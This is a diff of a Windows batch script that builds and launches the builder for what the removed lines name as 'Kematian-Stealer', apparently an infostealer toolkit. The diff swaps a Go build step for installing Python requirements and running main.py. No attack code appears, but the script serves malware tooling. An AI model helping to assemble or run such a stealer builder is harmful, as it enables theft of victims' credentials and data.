@@ -1,36 +1,30 @@
 @echo off
+setlocal
 
 cd /d %~dp0
 
-echo THIS IS IF YOU WANT TO BUILD THE BUILDER YOURSELF.
-echo THE BUILDER IS ALREADY BUILT BY GITHUB AND IS 100% OPEN SOURCE.
-echo THE BUILT BUILDER IS IN THE RELEASES ON THE GITHUB.
-echo https://github.com/Somali-Devs/Kematian-Stealer/releases/tag/Builder
-echo.
-echo.
-echo Press any key to continue building the builder yourself.
-
-pause
-
-go version
-if %errorlevel% neq 0 (
-    echo "Go is not installed or not in PATH. Either install it or use the prebuilt builder image."
-    start "https://golang.org/dl/"
+python --version
+if errorlevel 1 (
+    echo Python not found
     pause
     exit /b 1
 )
 
-cd builder-src
-go mod tidy
-go install fyne.io/fyne/v2/cmd/fyne@latest
-call build.bat
-cd ..
+python -m pip install -r requirements.txt
+if errorlevel 1 (
+    echo Failed to install requirements
+    pause
+    exit /b 1
+)
 
-timeout /t 3 /nobreak >nul
+cls
 
-move /y builder-src\dist\builder.exe builder.exe
-
-start builder.exe
+python main.py
+if errorlevel 1 (
+    echo Failed to run main
+    pause
+    exit /b 1
+)
 
 pause
-exit /b %errorlevel%
+exit /b 0
